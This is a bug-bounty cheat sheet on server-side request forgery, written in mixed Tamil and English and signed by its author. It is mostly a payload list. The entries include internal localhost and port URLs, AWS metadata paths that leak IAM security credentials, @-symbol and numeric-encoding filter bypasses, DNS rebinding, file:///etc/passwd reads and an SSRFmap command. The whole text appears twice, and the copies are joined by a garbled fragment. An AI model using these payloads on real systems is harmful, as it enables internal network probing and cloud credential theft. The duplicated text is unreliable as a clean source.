# SSRF - Server Side Request Forgery

## What is SSRF?
Server ah vechu vera internal system ah attack panrathu. Server namma kudutha URL ah fetch pannum da.

Example: 
User Input: url=https://google.com -> Server fetch pannum
Attacker: url=http://127.0.0.1 -> Server internal ah fetch pannidum = BUG!

## Common Vulnerable Parameters
- url=
- uri=
- path=
- dest=
- redirect=
- image_url=
- webhook=
- next=
- data=
- feed=
- link=

## Payloads & Tricks

### 1. Check Internal Network
http://localhost
http://127.0.0.1
http://[::]
http://0.0.0.0
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379

### 2. AWS Metadata - GOLD MINE!
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

### 3. Bypass with @ Symbol
http://google.com@127.0.0.1
http://127.0.0.1%20@google.com
http://127.0.0.1%09@google.com

### 4. Bypass with Encoding
http://0x7f.0.0.1 = 127.0.0.1 in hex
http://2130706433 = 127.0.0.1 in decimal
http://0177.0.0.1 = octal bypass

### 5. DNS Rebinding Trick
attacker.com -> 127.0.0.1 nu resolve aagura maathiri setup pannu. WAF bypass aagum.

## How to Test in Burp Suite
1. url param kandupidi
2. Request ah Repeater ku anuppu
3. Burp Collaborator link kudu: http://your-id.oastify.com
4. Collaborator la hit vantha SSRF confirm!
5. Aprom localhost / 169.254.169.254 try pannu

## Checklist for Bug Hunting
- [ ] Collaborator hit varutha?
- [ ] localhost access aagutha?
- [ ] AWS metadata leak aagutha?
- [ ] Bypass techniques try panniya?
- [ ] Internal port scan panniya?
- [ ] File read with file:///etc/passwd try panniya?

## Real Bug Example
Image upload feature la image_url=http://127.0.0.1 kodutha internal admin panel leak aachu da!

## Impact
- Internal port scanning
- AWS keys leak - Critical bug!
- File read / RCE in some cases

## Tools
- Burp Collaborator
- SSRFmap - python ssrfmap.py -r request.txt -p url
- HackTricks - SSRF

---
Made by Madhan - Trichy to Bugcrowd Hall of Fame! 
100% Complete - @hackermadhan2406Enter## SSRF - Server Side Request Forgery

## What is SSRF?
Server ah vechu vera internal system ah attack panrathu. Server namma kudutha URL ah fetch pannum da.

Example: 
User Input: url=https://google.com -> Server fetch pannum
Attacker: url=http://127.0.0.1 -> Server internal ah fetch pannidum = BUG!

## Common Vulnerable Parameters
- url=
- uri=
- path=
- dest=
- redirect=
- image_url=
- webhook=
- next=
- data=
- feed=
- link=

## Payloads & Tricks

### 1. Check Internal Network
http://localhost
http://127.0.0.1
http://[::]
http://0.0.0.0
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379

### 2. AWS Metadata - GOLD MINE!
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

### 3. Bypass with @ Symbol
http://google.com@127.0.0.1
http://127.0.0.1%20@google.com
http://127.0.0.1%09@google.com

### 4. Bypass with Encoding
http://0x7f.0.0.1 = 127.0.0.1 in hex
http://2130706433 = 127.0.0.1 in decimal
http://0177.0.0.1 = octal bypass

### 5. DNS Rebinding Trick
attacker.com -> 127.0.0.1 nu resolve aagura maathiri setup pannu. WAF bypass aagum.

## How to Test in Burp Suite
1. url param kandupidi
2. Request ah Repeater ku anuppu
3. Burp Collaborator link kudu: http://your-id.oastify.com
4. Collaborator la hit vantha SSRF confirm!
5. Aprom localhost / 169.254.169.254 try pannu

## Checklist for Bug Hunting
- [ ] Collaborator hit varutha?
- [ ] localhost access aagutha?
- [ ] AWS metadata leak aagutha?
- [ ] Bypass techniques try panniya?
- [ ] Internal port scan panniya?
- [ ] File read with file:///etc/passwd try panniya?

## Real Bug Example
Image upload feature la image_url=http://127.0.0.1 kodutha internal admin panel leak aachu da!

## Impact
- Internal port scanning
- AWS keys leak - Critical bug!
- File read / RCE in some cases

## Tools
- Burp Collaborator
- SSRFmap - python ssrfmap.py -r request.txt -p url
- HackTricks - SSRF

---
Made by Madhan - Trichy to Bugcrowd Hall of Fame! 
100% Complete - @hackermadhan2406Enteradhan2406
